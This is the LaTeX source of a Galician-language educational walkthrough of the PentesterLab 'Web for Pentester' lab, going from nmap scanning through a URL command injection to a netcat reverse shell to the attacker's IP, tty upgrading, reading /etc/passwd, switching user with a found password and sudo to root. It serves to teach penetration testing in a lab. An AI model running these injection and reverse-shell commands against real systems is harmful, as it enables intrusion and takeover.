\documentclass[a4paper]{article}

\usepackage[utf8]{inputenc}
\usepackage[galician]{babel}
\usepackage[margin=2cm, top=2cm, includefoot, bottom=2.4cm]{geometry}
\usepackage{graphicx} %Inserción imaxes
\usepackage[export]{adjustbox}
\graphicspath{ {images/} }
\usepackage[table,xcdraw]{xcolor}
\usepackage[T1]{fontenc}
\usepackage[most]{tcolorbox} %Inserción cadrados
\usepackage{fancyhdr} % Definición estilo páxina
\usepackage[hidelinks]{hyperref} % Xestión hipervínculos
\usepackage{listings} %Inserción de código no documento
\usepackage{parskip} %Quitar tabulación paragrafos
\usepackage{smartdiagram}
\usepackage{tikz}
\usepackage{zed-csp} %Inserción de esquemas
\usepackage{enumitem}
\usepackage[none]{hyphenat} %Evitar cortar palabras no fin de liña
\usepackage[toc,page]{appendix}

% Cores
\definecolor{bluePortada}{HTML}{0850BF}
\definecolor{blackFondoImaxes}{HTML}{1A1C23}

% Variables
\newcommand{\logoPortada}{pentesterlab_logo_new.png}
\newcommand{\machineName}{Web for Pentester}\par
\newcommand{\logoMachine}{machine_pentesterlab_logo.png}
\newcommand{\logoMachineRhead}{machine_pentesterlab_logo_rhead.png}
\newcommand{\infoMachine}{machine_pentesterlab_info.png}
\newcommand{\pingMachine}{ping_pentesterlab.png}
\newcommand{\nmapAllPorts}{nmap_pentesterlab_allPorts.png}
\newcommand{\nmapTargeted}{nmap_pentesterlab_targeted.png}
\newcommand{\whatwebMachine}{whatweb_pentesterlab.png}
\newcommand{\ccbysa}{88x31.png}
\newcommand{\urlsInterese}{urls-de-interese.png}
\newcommand{\startDate}{\today}
\newcommand{\ipTarget}{192.168.120.100}
\newcommand{\ipLocal}{192.168.120.101}
%\newcommand{\reverseShell1}{reverse-shell-1.png}
\newcommand{\reverseShellTwo}{reverse-shell-2.png}
\newcommand{\reverseShellThree}{reverse-shell-3.png}
\newcommand{\reverseShellFour}{reverse-shell-4.png}
\newcommand{\reverseShellFive}{reverse-shell-5.png}
\renewcommand{\lstlistingname}{Código}
\renewcommand{\appendixpagename}{Anexos}
\renewcommand{\appendixtocname}{Anexos}
\renewcommand{\appendixname}{Anexo}

% Adicionais
\setlength{\headheight}{60.2pt}
\setlength{\footskip}{20pt}
\setlength{\textheight}{680pt}
\pagestyle{fancy}
\fancyhf{}
\fancyhfoffset[L,R]{1.4cm}
\lhead{\includegraphics[width=6cm]{\logoPortada}\\}
\rhead{\includegraphics[width=6cm]{\logoMachineRhead}}
\fancyfoot[R]{\hspace{0.1cm}\\\hspace{0.1cm}\\\thepage}
\fancyfoot[L]{\textbf{Ricardo Feijoo Costa}\\
\href{http://creativecommons.org/licenses/by-sa/4.0/}{\includegraphics[scale=0.6]{\ccbysa}}\\
\href{http://creativecommons.org/licenses/by-sa/4.0/}{\textbf{\color{blue}Creative Commons Attribution-ShareAlike 4.0 International License}}}
\renewcommand{\headrulewidth}{3pt}
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2,
    escapechar=¬,
    columns=fullflexible
}

\lstset{style=mystyle}

\usetikzlibrary{positioning, shapes, arrows, shadows.blur}
\makeatletter % N.B.
\tikzset{module/.style={%
      \pgfkeysvalueof{/smart diagram/module shape},
      thick,
      draw=\sm@core@bordercolor,
      top color=white,
      bottom color=\col,
      text=\sm@core@textcolor,
      % text width=\sm@core@moduletextwidth, % Only necessary change
      minimum width=\sm@core@modulewidth,
      minimum height=\sm@core@moduleheight,
      font=\sm@core@modulefontsize,
      \sm@core@borderdecoration,
      node distance=1cm
   },
   diagram arrow type/.style={%
      \sm@core@arrowstyle,
      >=\sm@core@arrowtip,
      line width=\sm@core@arrowlinewidth,
      \col
   },%
}
\makeatother

% ------------------------------------------------------------
\begin{document}
        \begin{titlepage}
        \vspace*{-4cm}
        \centering
        \href{https://pentesterlab.com/}{\includegraphics[width=0.4\textwidth]{\logoPortada}}\par
        {\scshape\Large \textbf{Informe Técnico: Walkthrough Reverse Shell}\par}
        {\huge\bfseries\textcolor{bluePortada}{Exercicio: \machineName}\par}
        \includegraphics[width=0.7\textwidth,height=10cm,keepaspectratio,cfbox=blue 1pt 1pt]{\logoMachine}\par\
        % ------------------------------------------------------------
        % ------------------------------------------------------------
        \tikzstyle{blockRounder} = [rectangle, draw, text centered, rounded corners=3pt, minimum height=2em, blur shadow={shadow blur steps=5}]
        \tikzstyle{connector} = [draw, -latex']
        \begin{adjustbox}{width=0.9\paperwidth,center}
          \begin{tikzpicture}
          \node [blockRounder, fill=pink!80] at (-21.5,0) (start) {http://192.168.120.100};
          \node [blockRounder, fill=green!8!white] at (-18,0) (one) {\begin{tabular}{c}Commands\\injection\end{tabular}};
          \node [blockRounder, fill=blue!20] at (-15.5,0) (two) {Example1};
          \node [blockRounder, fill=green!20] at (-7.95,0) (three) {\begin{tabular}{c}http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1;whereis nc\end{tabular}};
          \node [blockRounder, fill=orange!20] at (-3.5,-1.25) (four) {\begin{tabular}{c}reverse\\shell\end{tabular}};
          \node [blockRounder, fill=yellow!20] at (-6.3,-1.25) (five) {\begin{tabular}{c}No cliente:\\\$ nc -lnvp 4444\end{tabular}};
          \node [blockRounder, fill=pink!20] at (-16.4,-1.25) (six) {\begin{tabular}{c}http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1;nc -e /bin/sh 192.168.120.101 4444\end{tabular}};
          \node [blockRounder, fill=cyan!20] at (-22.2,-3.6) (seven) {\begin{tabular}{c}No cliente\\reverse shell activa\end{tabular}};
          \node [blockRounder, fill=brown!20] at (-18.7,-3.6) (eight) {tratamento tty};
          \node [blockRounder, fill=violet!20] at (-14.6,-3.6) (nine) {\begin{tabular}{c}\$ script /dev/null -c bash\\Ctrl+Z\\stty raw -echo;fg\\reset\\xterm\\export TERM=xterm\\export SHELL=bash\\stty rows 34 columns 80\end{tabular}};
          \node [blockRounder, fill=lime!60] at (-10.7,-3.6) (ten) {\begin{tabular}{c}\$ whoami\\www-data\end{tabular}};
          \node [blockRounder, fill=red!80] at (-7.1,-3.6) (eleven) {\begin{tabular}{c}Escalada de privilexios\end{tabular}};
          \node [blockRounder, fill=yellow!80] at (-2.9,-3.6) (twelve) {\begin{tabular}{c}Movemento lateral\\Usuario user\end{tabular}};
          \node [blockRounder, fill=blue!40] at (-5.1,-6.2) (thirteen) {\begin{tabular}{c}\$ ls -la /home\\\$ ls -la /home/user\\\$ cat /home/user/.su-to-root\\\$ mount | grep live\\\$ su - user\\live\\\$ sudo su -\end{tabular}};
          \node [blockRounder, fill=black] at (-9.2,-6.2) (end) {\color{white}\begin{tabular}{c}\# whoami\\root\end{tabular}};
          \path [connector] (start) -- (one);
          \path [connector] (one) -- (two);
          \path [connector] (two) -- (three);
          \path [connector] ([xshift=-2mm] three.south east) |- (four);
          \path [connector] (four) -- (five);
          \path [connector] (five) -- (six);
          \path [connector] ([xshift=2mm] six.south west) |- (seven);
          \path [connector] (seven) -- (eight);
          \path [connector] (eight) -- (nine);
          \path [connector] (nine) -- (ten);
          \path [connector] (ten) -- (eleven);
          \path [connector] (eleven) -- (twelve);
          \path [connector] ([xshift=-2mm] twelve.south east) |- (thirteen);
          \path [connector] (thirteen) -- (end);
          \end{tikzpicture}
        \end{adjustbox}
        % ------------------------------------------------------------
        % ------------------------------------------------------------
        \vspace*{-0.6cm} 
        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-1mm,yshifttext=-1mm},
        colback=red!5!white,colframe=red!75!black,colbacktitle=red!90!black,
  title=LIMITACIÓN DE RESPONSABILIDADE,fonttitle=\bfseries,
  boxed title style={size=small,colframe=red!75!black} ]
               O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Por tanto, non se fai responsable en ningún caso, nin pode ser considerado legalmente responsable en ningún caso, das consecuencias que poidan derivarse da información contida nel ou que esté enlazada dende ou hacia el, incluíndo os posibles erros e información incorrecta existentes, información difamatoria, así como das consecuencias que se poidan derivar sobre a súa aplicación en sistemas de información reais e/ou virtuais. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.
        \end{tcolorbox}
        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
  title=De Interese,fonttitle=\bfseries,
  boxed title style={size=small,colframe=red!50!black} ]
  \centering
        \begin{itemize}[leftmargin=5.5mm]
        \item Informe xerado con \href{https://www.latex-project.org/}{\color{blue}{\LaTeX}}
        \item Informe baseado no vídeo de \href{https://youtu.be/riNRHoEOBeU}{\color{blue}{S4vitar: Cómo crear un reporte profesional en LaTeX}}
        \item \href{https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester/}{\color{blue}{https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester/}}
        \end{itemize}
\end{tcolorbox}
        {\large \startDate \par}
        \end{titlepage}
        % ------------------------------------------------------------
        % Índice
        \clearpage
        \tableofcontents
        \clearpage
        % ------------------------------------------------------------
        \section{Escenario}
        \begin{itemize}
                \item Plataforma \href{https://pentesterlab.com}{\textbf{\color{blue}PentesterLab}}.
                \item Prerrequisito: Ter realizada a práctica \href{https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/SI/Pentester/Practica-SI-PentesterLab_pageNumbers.pdf}{\textbf{\color{blue}[4] Practica-SI-PentesterLab}}
                \item Exercicio \textbf{\machineName} 
        \end{itemize}
        \vspace{0.2cm}
        \begin{figure}[h]
                \centering
                \includegraphics[width=0.4\textwidth]{\infoMachine}
                \caption{Web for Pentester: This exercise is a set of the most common web vulnerabilities.}
        \end{figure}
        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
  title=Dirección URL,fonttitle=\bfseries,
  boxed title style={size=small,colframe=red!50!black} ]
  \centering
  \vspace{0.1cm}
  \href{https://pentesterlab.com/exercises/web\_for\_pentester/course}{\color{blue}{https://pentesterlab.com/exercises/web\_for\_pentester/course}}
\end{tcolorbox}

\clearpage
        \section{Obxectivos}
        \begin{itemize}
                \item Auditar o servidor \textbf{\machineName}
                \item Enumerar posibles vectores de explotación
                \item Determinar alcance e impacto dun ataque sobre o sistema en produción.
        \end{itemize}
        \subsection{Fluxo de traballo}
        \vspace{0.5cm}

        \begin{figure}[h]
                \begin{center}
                \hspace*{4cm}
                        \smartdiagram[priority descriptive diagram]{
                        Recoñecemento sobre o sistema,
                        Detección de vulnerabilidades,
                        Explotación de vulnerabilidades,
                        Escalada de privilexios
                        }
                        \begin{tikzpicture}[overlay]
                                \node[left=of module4,xshift=-60mm,yshift=-13mm]{\begin{tcolorbox}[colback=white,colframe=red!75!black,hbox]{\textbf{\color{red}{Acceso root}}}\end{tcolorbox}};
                                \node[left=of module3,xshift=-60mm,yshift=-13mm]{\begin{tcolorbox}[colback=white,colframe=red!75!black,hbox]{\textbf{\color{red}{Acceso ao sistema: usuario www-data}}}\end{tcolorbox}};
                                \node[left=of module2,xshift=-1mm,yshift=-1mm] {};
                                \node[left=of module1,xshift=-1mm,yshift=1mm] {};
                        \end{tikzpicture}
                \end{center}
                \caption{Fluxo de traballo}
        \end{figure}

        \clearpage

        \section{Análisis de vulnerabilidades}
        \subsection{Recoñemento inicial}
        \vspace{0.2cm}
        \begin{itemize}
                \item Comprobación de conectividade e detección de sistema operativo: 
                \begin{itemize}
                        \item TTL $\simeq$ 64 $\Rightarrow$ GNU/Linux
                        \item TTL $\simeq$ 128 $\Rightarrow$ Microsoft Windows
                \end{itemize}

        \begin{figure}[h]
                \begin{center}
                        \begin{tcolorbox}[colback=blackFondoImaxes,hbox]
                                \includegraphics[width=0.5\textwidth,height=8cm,keepaspectratio]{\pingMachine}
                        \end{tcolorbox}
                \end{center}
                \caption{Recoñecemento inicial sobre o sistema obxectivo}
        \end{figure}

        \vspace{0.2cm}

                \item Escaneo/detección de portos abertos mediante \textbf{nmap}
        \begin{lstlisting}[language=Bash, caption=nmap: Portos TCP open]
$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ¬\ipTarget¬\end{lstlisting}
         \begin{figure}[h]
                \begin{center}
                        \begin{tcolorbox}[colback=blackFondoImaxes,hbox]
                                \centering
                                \includegraphics[width=0.8\textwidth,height=8cm,keepaspectratio]{\nmapAllPorts}
                        \end{tcolorbox}
                \end{center}
                \caption{Recoñecemento con nmap}
        \end{figure}

        \clearpage
        \item Detección de servizos e versións sobre os portos sobre os cales foi posible explotar o sistema:

        \begin{lstlisting}[language=Bash, caption=nmap scripting sobre servizos e versións]
$ sudo nmap -p22,80,389 -sCV -vvv -n ¬\ipTarget¬\end{lstlisting}
         \begin{figure}[h]
                \begin{center}
                \makebox[\textwidth]{\includegraphics[width=0.9\paperwidth]{\nmapTargeted}}
                \caption{Numeración de servizos e versións}
                \label{fig:servicesResults}
                \end{center}
        \end{figure}

        \end{itemize}
        \subsection{Enumeración servidor web}
        \vspace{0.2cm}

        \begin{schema}{TCP}
        Porto
        \where
        80
        \end{schema}

        \subsubsection{whatweb}
        \vspace{0.2cm}
        Empregando a ferramenta \textit{whatweb} buscamos información sobre que tecnoloxías está a empregar a máquina \textit{Web for Pentester}: 
         \begin{figure}[h]
                \centering
                \includegraphics[width=1.0\textwidth]{\whatwebMachine}
                \caption{whatweb http://\ipTarget}
        \end{figure}

        \clearpage
        Accedendo co navegador atopamos unha interface na cal podemos probar un conxunto das vulnerabilidades web máis comúns (Revisar  
        \href{https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/SI/Pentester/Practica-SI-PentesterLab_pageNumbers.pdf}{\color{blue}[4]})\par
        Imos a centrarnos no \textbf{Example1} do tipo de vulnerabilidades \large{\textbf{Commands injection}}:

        \begin{figure}[h]
                \centering
                \includegraphics[width=0.8\textwidth]{\infoMachine}
                \caption{Web for Pentesting: http://\ipTarget}
        \end{figure}

\clearpage
        \section{Explotación de vulnerabilidades}
        \vspace{0.2cm}
        \subsection{Acceso ao sistema}
        \vspace{0.2cm}


Entón, imos probar como podemos executar un comando non esperado ao abrir a ligazón de \textbf{Example1 (Commands injection)}. Así, modificamos a URL como segue:\par
        \begin{lstlisting}[language=Bash, caption=Execución do comando whoami empregando un caracter ; logo da URL orixinal, linewidth=18.7cm]
http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1;whoami\end{lstlisting}\par
De tal forma que conseguimos executar o comando \textbf{whoami} no servidor Web, obtendo como saída o valor:  \textbf{\color{red}www-data}. Deste xeito, o usuario co que estamos a executar comandos a través da URL é o usuario \textbf{\color{red}www-data} (Pois sendo o servidor Web Apache o usuario e grupo por defecto son: \textbf{\color{red}www-data}, \textbf{\color{red}www-data} [Ver \href{https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/SI/Criptografia/Practica-SI-Apache.pdf}{\textbf{\color{blue}[5]}}]).
Entón, imos intentar conseguir unha {\it{reverse shell}}. Para iso realizaremos o seguinte procedemento:
        \begin{enumerate}[label=(\arabic*)]
          \item Comprobar se existe o comando {\it{netcat (nc)}} no host do servidor Web.
          \item Se existe, abrir no equipo cliente (atacante) un porto a través do comando {\it{netcat (nc)}} para esperar unha reverse shell.
          \item Executar a través da URL un comando {\it{netcat (nc)}} que se comunique co host cliente (atacante) enviándolle a reverse shell.
          \item Obtendo a reverse shell no host cliente (atacante) facer un tratamento da {\it{tty}} (Ver \href{https://s4vitar.github.io/oscp-preparacion/\#pentesting-linux}{\textbf{\color{blue}[10]}} para poder traballar con esta consola de forma análoga a se fose unha consola local, é dicir, poder empregar atallos de teclado como \textbf{Ctrl+C} e non perder a conexión, poder empregar \textbf{Ctrl+L} para limpar a pantalla, ter o mesmo número de liñas e columnas na shell inversa que nunha consola local, etc.
        \end{enumerate}


        \vspace{0.2cm}
        \subsection{Reverse shell}
        \vspace{0.2cm}
        \begin{lstlisting}[language=Bash, caption=Comprobar se existe o comando {\it{netcat (nc)}} no host do servidor Web, linewidth=18.7cm]
http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1;whereis nc\end{lstlisting}

        \begin{lstlisting}[language=Bash, caption=No host cliente (atacante): Abrir no equipo cliente o porto TCP 4444 a través do comando {\it{netcat (nc)}} para esperar unha reverse shell, linewidth=18.7cm]
$ nc -lnvp 4444
listening on [any] 4444 ...\end{lstlisting}

        \begin{lstlisting}[language=Bash, caption=Executar a través da URL un comando netcat que se comunique co host cliente (atacante) enviándolle a reverse shell, linewidth=18.7cm]
http://192.168.120.100/commandexec/example1.php?ip=127.0.0.1;nc -e /bin/sh 192.168.120.101 4444\end{lstlisting}

        \begin{lstlisting}[language=Bash, caption=No host cliente (atacante): Facer un tratamento da tty na reverse shell obtida, linewidth=18.7cm]
$ 
script /dev/null -c bash
Ctrl+Z
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash\end{lstlisting}

        \includegraphics[width=0.7\textwidth,height=10cm,keepaspectratio,cfbox=blue 1pt 1pt]{\reverseShellTwo}\par
        \includegraphics[width=0.6\textwidth,keepaspectratio,cfbox=blue 1pt 1pt]{\reverseShellThree}\par

\vspace{0.8cm}
        \begin{lstlisting}[language=Bash, caption=No host cliente (atacante): Abrir unha nova consola e averiguar o tamaño (filas e columnas) da tty, linewidth=18.7cm]
$ stty -a\end{lstlisting}
        \includegraphics[width=0.7\textwidth,height=10cm,keepaspectratio,cfbox=blue 1pt 1pt]{\reverseShellFour}\par\

        \begin{lstlisting}[language=Bash, caption=No host cliente (atacante): Pór o número de liñas e columnas da tty na shell inversa cos mesmos valores que unha shell local do host do atacante, linewidth=18.7cm]
$ stty rows 34 columns 80\end{lstlisting}
        \includegraphics[width=0.7\textwidth,height=10cm,keepaspectratio,cfbox=blue 1pt 1pt]{\reverseShellFive}\par\

        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
  title=De Interese,fonttitle=\bfseries,
  boxed title style={size=small,colframe=red!50!black} ]
        \centering
\href{https://s4vitar.github.io/oscp-preparacion/\#pentesting-linux}{\textbf{\color{blue}https://s4vitar.github.io/oscp-preparacion/\#pentesting-linux}}
\end{tcolorbox}

        \clearpage
        \section{Escalada de privilexios}
        \vspace{0.2cm}
        \subsection{Movemento lateral: usuario user}
Agora na shell inversa estamos conectado co usuario \textbf{\color{red}www-data}. Imos ver se somos quen de acceder con outro usuario do sistema e de aí ver se somos quen de escalar privilexios para chegar a conseguir ser o usuario \textbf{root}:
        \begin{lstlisting}[language=Bash, caption=Outros usuarios existentes no sistema]
$ whoami
www-data
$ cat /etc/passwd
$ ls -la /home
$ ls -la /home/user
$ cat /home/user/.su-to-root
$ mount | grep live
\end{lstlisting}
        \begin{lstlisting}[language=Bash, caption=Acceso co usuario user]
$ su - user
Password: live
user$ whoami
user
\end{lstlisting}
        \begin{lstlisting}[language=Bash, caption=Escalada de privilexios: sudo]

user$ sudo su - 
#
\end{lstlisting}

\subsection{Usuario root}
        \begin{lstlisting}[language=Bash, caption=Usuario root]
# whoami
root
#\end{lstlisting}
        
\clearpage
\begin{appendices}
\addtocontents{toc}{\protect\setcounter{tocdepth}{2}}
\makeatletter
\addtocontents{toc}{%
\begingroup
\let\protect\l@section\protect\l@subsection
}

\vspace*{-0.7cm}
\section{URLs de Interese}
\vspace*{-0.2cm}
        \centering
        \input{include/URLs-de-Interese-Pentesting-PentesterLab.tex}
\addtocontents{toc}{\endgroup}
\end{appendices}

\end{document}
